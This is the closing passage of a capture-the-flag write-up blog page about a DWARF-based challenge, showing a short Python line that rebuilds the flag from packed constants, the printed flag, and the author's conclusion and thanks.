<span class=n>flag</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;OOO{&#39;</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x72617764</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x68732066</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x636c6c65</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x7365646f</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x65726120</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x72657620</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x656c2079</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x7d7465</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</code></pre></div><p></p><div class=codehilite><pre><span></span><code>OOO{dwarf shellcodes are very leet}
</code></pre></div><h2>Conclusion</h2><p>I found this challenge very interesting as I learned a lot about the capabilities of DWARF. It still amazes me how complex this language is and all the things one can do with it.</p><p>I'd like to thank <a href=https://twitter.com/yrp604>yrp</a>, <a href=https://twitter.com/0xGrimmlin>grimmlin</a>, burrito and clz for their help during this challenge and the time spent helping a dummy.</p></article><hr></main><footer> 2021 - Antide Petit aka <a href=/ >xarkes</a> - <a href=https://creativecommons.org/licenses/by-sa/4.0/ >CC-BY-SA</a> - Made with  </footer></body></html>